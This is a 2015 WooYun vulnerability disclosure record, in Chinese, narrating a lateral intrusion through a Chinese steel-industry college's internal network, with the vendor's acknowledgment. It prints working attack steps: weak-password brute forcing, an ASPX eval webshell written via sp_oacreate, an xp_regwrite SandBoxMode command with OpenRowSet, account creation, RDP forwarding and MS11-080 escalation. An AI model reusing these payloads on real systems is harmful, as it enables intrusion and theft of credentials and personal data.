{"id": 83664, "wybug_id": "wooyun-2015-0147107", "wybug_title": "武钢学院内网漫游", "wybug_corp": "武钢大学", "wybug_author": "WhiteMind", "wybug_date": "2015-10-16 10:41", "wybug_open_date": "2015-12-04 16:56", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["内网漫游"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-04：\t细节向公众公开  简要描述：  详细说明：  主站见到一个无域名的系统链接,进入\n\n找到上传文件的地址,发现地址里面有用户名 users/admin\n\n获得大量用户名\n\n因为没有验证码,所以用burp跑了弱口令,获得大量可登录账户,选择了ccgl/123456\n\n上传点无限制,一句话\n\n\n\njsp权限一般都是administrator,直接net user add\n\n由于是内网主机,所以lcx 3389转发出来,至此边界突破\n\n\n\n在DE盘发现若干网站和数据库备份,随后全盘搜索web.config,获得大量数据库连接用户名和密码(下图中有部分是从其他服务器上搜集的)\n\n通过其中一个连接上了**.**.**.** sa权限 sql2000的企业客户端是不支持直接查询exec的,所以下了个navicat连上\n\n这个数据库提权是我遇到的比较棘手的一个 xp_cmdshell肯定是禁了没跑,恢复失败随后尝试SP_OAcreate,虽然提示执行成功,但其实没有起到作用然后用xp_regwrite开启沙盒模式,用select * From OpenRowSet执行命令失败提示\nxpsql.cpp: 错误 5 来自 CreateProcess\n然后扫了下端口发现开着80\n\n进去翻了会虽然有上传点但是没有上传目录(直接通过download.aspx?id的方式下载的)然后便用sql的xp_dirtree找这个网站的根目录\n\n猜测是weboa_sj,于是进入看看,对比web目录然后发现结构一致,直接写入aspx一句话\ndeclare @o int, @f int, @t int, @ret intexec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'createtextfile', @f out, 'd:\\weboa_sj\\oneaspx.aspx', 1exec @ret = sp_oamethod @f, 'writeline', NULL, '<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"1\"],\"unsafe\");%>'\n上菜刀连,是默认的iis低权帐号,无法net user add\n\n随后systeminfo看补丁,发现没打ms11080.exe的\n\n直接上ms11080溢出拿到administrator权限的用户,90sec/90sec mstsc连上\n\n主站和oa都在,数据库里有很多别的子站连接过来的,可以通过这个获取密码进一步渗透其他子站的服务器同时DE盘还有大量的考试站点和数据库备份,以及考生的详细资料\n\n在**.**.**.**上也获得了大量的web.config,从里面提取出了用户名以及密码统一和上一份何在一起做了个user.txt和pass.txt,然后丢进hscan跑mssql\n\n这些都是跑出来的,没有第一台那么难提,直接开沙盒模式\nexec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1\n然后select * From OpenRowSet执行net user add 都拿下\n\n内网的大部分数据库服务器应该都是这些了,可以通过这个大量入侵内网开了http服务的服务器渗透测试至此结束,未再深入 注:在两台服务器上已发现入侵痕迹 **.**.**.**:\n\n入侵日期大概在07年8月左右另一台忘记是哪台了,在里面看到了大量的木马,另外官网有些时候会被劫持跳转到抽奖什么的,可能是因为主页被人篡改加了js   漏洞证明：  \n\n   修复方案：  全面检查   版权声明：转载请注明来源 WhiteMind@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-10-20 16:54 厂商回复： CNVD确认所述情况，已经转由CNCERT下发给赛尔教育，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}